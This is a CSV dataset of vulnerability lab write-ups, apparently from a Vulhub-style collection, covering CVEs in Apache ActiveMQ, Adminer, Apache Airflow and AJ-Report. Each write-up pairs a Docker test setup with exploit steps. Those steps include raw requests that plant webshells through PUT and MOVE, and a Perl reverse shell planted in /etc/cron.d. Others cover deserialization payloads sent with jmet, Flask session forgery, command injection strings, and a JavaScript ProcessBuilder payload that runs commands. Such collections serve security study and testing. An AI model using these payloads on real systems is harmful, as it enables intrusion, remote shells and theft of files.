Software,CVE,Title,Info,References
activemq,CVE-2022-41678,Apache ActiveMQ Jolokia Authenticated Remote Code Execution (CVE-2022-41678),"Apache ActiveMQ Jolokia Authenticated Remote Code Execution (CVE-2022-41678)

中文版本(Chinese version)

Apache ActiveMQ is an open source messaging middleware developed by the American Pachitea (Apache) Software Foundation that supports Java messaging services, clustering, Spring framework, and more.

Apache ActiveMQ prior to 5.16.5, 5.17.3, there is a authenticated RCE exists in the Jolokia /api/jolokia.

References:
<https://activemq.apache.org/security-advisories.data/CVE-2022-41678-announcement.txt
<https://l3yx.github.io/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/

Vulnerable Environment

Execute following command to start a Apache ActiveMQ 5.17.3:


docker compose up -d


After server is started, open the http://your-ip:8161/ and input username and password with admin and admin. Then you will see the index page of Apache ActiveMQ.

Exploit

Firstly, listing all avaiable MBeans in Apache ActiveMQ by /api/jolokia/list:


GET /api/jolokia/list HTTP/1.1
Host: localhost:8161
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Connection: close
Cache-Control: max-age=0
Authorization: Basic YWRtaW46YWRtaW4=
Origin: http://localhost






There are 2 exploitable MBeans that are able to perform RCE in this list.

Method #1

The first one is using the org.apache.logging.log4j.core.jmx.LoggerContextAdminMBean, a MBean provided by Log4j2.

Attacker can use this MBean to update the Log4j configuration and write logs to arbitrary directories.

I prepared a poc to reproduce the whole process:


python poc.py -u admin -p admin http://your-ip:8161




Webshell is written to /admin/shell.jsp successfully:



This method is limited by version of ActiveMQ, since Log4j2 was introduced in Apache ActiveMQ 5.17.0.

Method #2

The second one is using the jdk.management.jfr.FlightRecorderMXBean MBean.

FlightRecorder was introduced in OpenJDK 11, users are able to use FlightRecorderMXBean to create record and save it to a file. This feature is also can be used to write webshell.

Use poc to reproduce the whole process:


python poc.py -u admin -p admin --exploit jfr http://localhost:8161




Webshell is written to /admin/shelljfr.jsp successfully:
-------------------------------------------------------------------------------","https://activemq.apache.org/security-advisories.data/CVE-2022-41678-announcement.txt
https://l3yx.github.io/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/
http://localhost
http://your-ip:8161
http://localhost:8161"
activemq,CVE-2016-3088,ActiveMQ Arbitrary File Write Vulnerability (CVE-2016-3088),"ActiveMQ Arbitrary File Write Vulnerability (CVE-2016-3088)

中文版本(Chinese version)

Environment setup

Enter following commands to build and run the vulnerability environment:


docker compose up -d


The environment listens to port 61616 and port 8161, of which 8161 is the web console port. This vulnerability appears in the web console.

Visit http://your-ip:8161/ to see the web page, indicating that the environment has been successfully run.

Background brief

ActiveMQ web console is divided into three applications, admin, api and fileserver, where admin is the administrator page, api is the interface, fileserver is the interface for storing files; admin and api need to log in before they can be used, fileserver does not need to log in.

fileserver is a RESTful API interface. We can read and write files stored in it through HTTP requests such as GET, PUT, and DELETE. The design purpose is to compensate for the defect that the message queue operation cannot transfer and store binary files, but later found that:

1. Its usage rate is not high
2. File operations are prone to vulnerabilities

Therefore, ActiveMQ has closed the fileserver application by default in 5.12.x~5.13.x (you can open it in conf/jetty.xml); after 5.14.0, the fileserver application is completely removed.

In the test process, you should pay attention to the version of ActiveMQ, prevent useless effort.

Vulnerability Details

This vulnerability appears in the Fileserver application, the vulnerability principle is actually very simple, that is, fileserver support to write files (but do not parse the JSP), while supporting the move file (MOVE request). So, we just need to write a file and then move it to any location by use a move request, causing arbitrary file write vulnerability.

Write files such as cron or ssh key

1. Write Webshell
2. Write files such as cron or ssh key
3. Write libraries and configuration files such as jar or jetty.xml

The advantage of writing webshell is convenient, but the fileserver don't parse jsp, admin and api both need to log in to access, so it is a bit futile; The advantage of writing cron or ssh key is to directly reverse Shell, it is convenient too, the disadvantage is that you need root privileges; write jar, a little trouble (requires jar back door), write xml configuration file, this method is more reliable, but there is a futile point: we need to know ActiveMQ absolute path.

Let we talk about the above several methods.

Write Webshell

As I said earlier, the Webshell needs to be written in the Admin or Api app, and both applications need to be logged in to access.

The default ActiveMQ account and password is admin. First, visit http://your-ip:8161/admin/test/systemProperties.jsp to view the absolute path of ActiveMQ:



Then upload Webshell:


PUT /fileserver/2.txt HTTP/1.1
Host: localhost:8161
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 120976

webshell...


Then move it to the API folder (/opt/activemq/webapps/api/s.jsp) in the Web directory:


MOVE /fileserver/2.txt HTTP/1.1
Destination: file:///opt/activemq/webapps/api/s.jsp
Host: localhost:8161
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 0


Access Webshell (login required):



Write crontab, automate reverse shell

This is a relatively stable method. First upload the cron configuration file (note that the newline must be \n, not \r\n, otherwise the crontab execution will fail):


PUT /fileserver/1.txt HTTP/1.1
Host: localhost:8161
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 248

/1    * root /usr/bin/perl -e 'use Socket;$i=""10.0.0.1"";$p=21;socket(S,PFINET,SOCKSTREAM,getprotobyname(""tcp""));if(connect(S,sockaddrin($p,inetaton($i)))){open(STDIN,""&S"");open(STDOUT,""&S"");open(STDERR,""&S"");exec(""/bin/sh -i"");};'


Move it to /etc/cron.d/root:


MOVE /fileserver/1.txt HTTP/1.1
Destination: file:///etc/cron.d/root
Host: localhost:8161
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 0


If both of the above requests return 204, the write is successful. Waiting for the reverse shell:



This method requires the ActiveMQ run as root, otherwise it will not be able to write to the cron file.

Write jetty.xml or jar

In theory we can override jetty.xml, remove the login restrictions for admin and api, and then write webshell.

In some cases, the owner of jetty.xml and jar is the user of the web container, so the success rate of writing crontab is higher.

Not tested yet.
-------------------------------------------------------------------------------",
activemq,CVE-2023-46604,Apache ActiveMQ OpenWire Protocol Deserialization RCE (CVE-2023-46604),"Apache ActiveMQ OpenWire Protocol Deserialization RCE (CVE-2023-46604)

中文版本(Chinese version)

Apache ActiveMQ is an open source messaging middleware developed by the American Pachitea (Apache) Software Foundation that supports Java messaging services, clustering, Spring framework, and more.

OpenWire protocol is designed by ActiveMQ, to allow native access to ActiveMQ from a number of different languages and platforms. Apache ActiveMQ prior to 5.18.2 was affected by a deserialization vulnerability. This vulnerability may allow remote attackers with network access privileges to execute arbitrary shell commands by manipulating the serialized class types in the OpenWire protocol, leading to the instantiation of any class on the classpath of the agent.

References:
<https://activemq.apache.org/news/cve-2023-46604
<https://xz.aliyun.com/t/12929
<https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/
<https://forum.butian.net/share/2566

Environment setup

ActiveMQ listens to following 2 ports:

| Default port | Default Condition                    |
|--------------|--------------------------------------|
| 8161 (web)   | Remote access requires configuration |
| 61616 (tcp)  | Remote access allowed                |

The deserialization issue exists in the port 61616.

Enter following commands to run a ActiveMQ 5.17.3 server:


docker compose up -d


Please access http://your-ip:8161 to confirm that the service has started successfully before exploitation, although we only need to use the port 61616 after that.

Exploit

You can quickly start an HTTP server in the folder where the poc.xml file is located using the Python3 http.server module:

shell
python3 -m http.server 6666


Then execute the poc.py:

shell
python3 poc.py target port http://ip of http server/poc.xml


You can check inside the ActiveMQ container using the following command:


docker exec cve-2023-46604-activemq-1 ls -l /tmp


If you see the output showing that touch /tmp/activeMQ-RCE-success has been executed successfully, then the exploit has worked.
-------------------------------------------------------------------------------","https://activemq.apache.org/news/cve-2023-46604
https://xz.aliyun.com/t/12929
https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/
https://forum.butian.net/share/2566
http://ip"
activemq,CVE-2015-5254,ActiveMQ Deserialization Vulnerability (CVE-2015-5254),"ActiveMQ Deserialization Vulnerability (CVE-2015-5254)

中文版本(Chinese version)

Apache ActiveMQ is an open source messaging middleware developed by the American Pachitea (Apache) Software Foundation that supports Java messaging services, clustering, Spring framework, and more.

Apache ActiveMQ version 5.x before the 5.13.0 security vulnerability, the vulnerability caused by the program does not limit the classes that can be serialized in the proxy. Remote attacker can make a special serialized Java Message Service (JMS) ObjectMessage objects exploit this vulnerability to execute arbitrary code.

Reference Links:
https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf

Vulnerability environment

Start the vulnerable environment:


docker compose up -d


After running the environment, it will establish two ports on port 61616 and 8161. Port 61616 is the working port, and messages are delivered on this port. Port 8161 is the webpage management page port. Access http://your-ip:8161, You can see the network management page, but this vulnerability does not require a network theoretically.

Exploit

The exploit process is as follows:

1. Generate serialized payload (u can using ysoserial)
2. send payload to port 61616
3. Access the web management page and read the serialization messages, then u can trigger vulnerability.

To exploit this environment we will use jmet (Java Message Exploitation Tool). First download the jar file of jmet, and create folder called external in the same directory (otherwise it may occur the error that the folder does not exist).

the jmet is to use ysoserial to generate Payload and send it (the jar comes with ysoserial, we don't no need to download it again), so we need to choose one that can be used in ysoserial as the gadget, such as ROME.

Execute:


java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y ""touch /tmp/success"" -Yp ROME your-ip 61616




At this point, a queue named event will be added to the target ActiveMQ.

You can visit http://your-ip:8161/admin/browse.jsp?JMSDestination=Event to see all messages in this queue.

(login / password: admin/admin):



Click this message to trigger the command execute, this time into the container docker compose exec activemq bash,

we can see /tmp/success has been successfully created, indicating exploit successful:



Replace the command with a reverse shell statement and reuse it:



It's worth noting that accessing messages through the web administration page and triggering the vulnerability requires administrator privileges. In the absence of password, we can induce administrator visit our link to trigger, or disguised as legitimate messages from other services need to wait for client access when triggered.
-------------------------------------------------------------------------------",https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf
adminer,CVE-2021-21311,Adminer Server-side Request Forgery on Error Page of Elasticsearch and ClickHouse (CVE-2021-21311),"Adminer Server-side Request Forgery on Error Page of Elasticsearch and ClickHouse (CVE-2021-21311)

中文版本(Chinese version)

Adminer is a tool for managing content in databases developed by PHP. It natively supports MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Elasticsearch and MongoDB.

In adminer from version 4.0.0 and before 4.7.9 there is a server-side request forgery vulnerability on error page of Elasticsearch and ClickHouse. Users of Adminer versions bundling all drivers (e.g. adminer.php) are affected. This is fixed in version 4.7.9.

References:
<https://github.com/vrana/adminer/security/advisories/GHSA-x5r2-hj5c-8jx6
<https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf
<https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-21311.yaml

Vulnerable environment

Execute following command to start a PHP server with Adminer 4.7.8:


docker compose up -d


After the server is started, you can see the login page of Adminer at http://your-ip:8080.

Exploit

Select the ElasticSearch as the system field, then input example.com into the server field. Click the login button, you will see the 400 response from example.com:
-------------------------------------------------------------------------------","https://github.com/vrana/adminer/security/advisories/GHSA-x5r2-hj5c-8jx6
https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf
https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-21311.yaml"
adminer,CVE-2021-43008,Adminer Remote Arbitrary File Read (CVE-2021-43008),"Adminer Remote Arbitrary File Read (CVE-2021-43008)

中文版本(Chinese version)

Adminer is a tool for managing content in databases developed by PHP. It natively supports MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Elasticsearch and MongoDB.

Improper Access Control in Adminer versions 1.12.0 to 4.6.2 (fixed in version 4.6.3) allows an attacker to achieve Arbitrary File Read on the remote server by requesting the Adminer to connect to a remote MySQL database.

References:
<https://github.com/p0dalirius/CVE-2021-43008-AdminerRead
<http://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability

Vulnerable environment

Execute following command to start a PHP server with Adminer 4.6.2:


docker compose up -d


After the server is started, you can see the login page of Adminer at http://your-ip:8080.

Exploit

Start a roguo MySQL server through mysql-fake-server, then paste the fileread_/etc/passwd into username field:



Receive the request and the /etc/passwd has been written into current directory:
-------------------------------------------------------------------------------","https://github.com/p0dalirius/CVE-2021-43008-AdminerRead
http://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability"
airflow,CVE-2020-17526,Apache Airflow Authentication Bypass (CVE-2020-17526),"Apache Airflow Authentication Bypass (CVE-2020-17526)

中文版本(Chinese version)

Apache Airflow is an open source, distributed task scheduling framework. Although authentication is not required by default, but the administration can specify the webserver.authenticate=True to enable it.

In the version prior to 1.10.13, Apache Airflow uses a default session secert key, which leads to impersonate arbitrary user when authentication is enabled.

References:
<https://lists.apache.org/thread/rxn1y1f9fco3w983vk80ps6l32rzm6t0
<https://kloudle.com/academy/authentication-bypass-in-apache-airflow-cve-2020-17526-and-aws-cloud-platform-compromise

Vulnerability Environment

Execute the following commands to start an airflow 1.10.10 server:

bash
Initialize the database
docker compose run airflow-init

Start service
docker compose up -d


After the server is started, browse the http://your-ip:8080 to see the login page of Apache Airflow. Yes, this server required authentication.

Exploit

Firstly, browse the login page and get a session string from Cookie:


curl -v http://localhost:8080/admin/airflow/login




Then, use flask-unsign to crack the session key:


flask-unsign -u -c [session from Cookie]




Bingo, we got the valid session key temporarykey. Then, use this key to generate a new session whose userid equals to 1:


flask-unsign -s --secret temporarykey -c ""{'userid': '1', 'fresh': False, 'permanent': True}""




Finally, use this generated session to log in successfully:
-------------------------------------------------------------------------------","https://lists.apache.org/thread/rxn1y1f9fco3w983vk80ps6l32rzm6t0
https://kloudle.com/academy/authentication-bypass-in-apache-airflow-cve-2020-17526-and-aws-cloud-platform-compromise
http://localhost:8080/admin/airflow/login"
airflow,CVE-2020-11981,Apache Airflow Celery Broker Remote Command Execution (CVE-2020-11981),"Apache Airflow Celery Broker Remote Command Execution (CVE-2020-11981)

中文版本(Chinese version)

Apache Airflow is an open source, distributed task scheduling framework. In the version prior to 1.10.10, if the Redis broker (such as Redis or RabbitMQ) has been controlled by attacker, the attacker can execute arbitrary commands in the worker process.

Since there are many components to be started, it may be a bit stuck. Please prepare more than 2G of memory for the use of the virtual machine.

References:
<https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx
<https://github.com/apache/airflow/pull/9178

Vulnerability Environment

Execute the following commands to start an airflow 1.10.10 server:

bash
Initialize the database
docker compose run airflow-init

Start service
docker compose up -d


Exploit

For exploit this vulnerability, you have to get the write permission of the Celery broker, Redis. In Vulhub environment, Redis port 6379 is exposing on the Internet.

Through the Redis, you can add the evil task airflow.executors.celeryexecutor.executecommand to the queue to execute arbitrary commands.

Use this script exploitairflowcelery.py to execute the command touch /tmp/airflowcelerysuccess


pip install redis
python exploitairflowcelery.py [your-ip]


See the results on the logs:

bash
docker compose logs airflow-worker




As you can see, touch /tmp/airflowcelerysuccess has been successfully executed:


docker compose exec airflow-worker ls -l /tmp
-------------------------------------------------------------------------------","https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx
https://github.com/apache/airflow/pull/9178"
airflow,CVE-2020-11978,Apache Airflow Command Injection in Example Dag (CVE-2020-11978),"Apache Airflow Command Injection in Example Dag (CVE-2020-11978)

中文版本(Chinese version)

Apache Airflow is an open source, distributed task scheduling framework. In the version prior to 1.10.10, there is a command injection vulnerability in the example DAG exampletriggertarget_dag, which caused attackers to execute arbitrary commands in the worker process.

Since there are many components to be started, it may be a bit stuck. Please prepare more than 2G of memory for the use of the virtual machine.

References:
<https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx
<https://github.com/pberba/CVE-2020-11978

Vulnerability Environment

Execute the following commands to start airflow 1.10.10:

bash
Initialize the database
docker compose run airflow-init

Start service
docker compose up -d


Exploit

Visit http://your-ip:8080 to see the airflow management terminal, and turn on the exampletriggertarget_dag flag:



Click the ""triger"" button on the right, then input the configuration JSON with the crafted payload {""message"":""'\"";touch /tmp/airflowdagsuccess;#""}:



Wait a few seconds to see the execution of ""success"":



Go to the CeleryWorker container to see the result, touch /tmp/airflowdagsuccess has been successfully executed:


docker compose exec airflow-worker ls -l /tmp
-------------------------------------------------------------------------------","https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx
https://github.com/pberba/CVE-2020-11978"
aj-report,Unknown,AJ-Report Authentication Bypass and Remote Code Execution (CNVD-2024-15077),"AJ-Report Authentication Bypass and Remote Code Execution (CNVD-2024-15077)

中文版本(Chinese version)

AJ-Report is an open source BI platform. In the version 1.4.0 and before, there is a authentication bypass issue and the attacker is able to perform arbitrary code execution through the issue.

References:
<https://xz.aliyun.com/t/14460
<https://github.com/wy876/POC/blob/main/AJ-Report%E5%BC%80%E6%BA%90%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B1%8F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md

Vulnerable environment

Execute following command to start a AJ-Report server 1.4.0:


docker compose up -d


After the server is started, you can see the login page of AJ-Report through http://your-ip:9095.

Exploit

To exploit the issue by following request:


POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
Host: your-ip:9095
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Connection: close
Content-Length: 339

{""ParamName"":"""",""paramDesc"":"""",""paramType"":"""",""sampleItem"":""1"",""mandatory"":true,""requiredFlag"":1,""validationRules"":""function verification(data){a = new java.lang.ProcessBuilder(\""id\"").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}""}


As you can see, id command is executed successfully:
-------------------------------------------------------------------------------","https://xz.aliyun.com/t/14460
https://github.com/wy876/POC/blob/main/AJ-Report%E5%BC%80%E6%BA%90%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B1%8F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
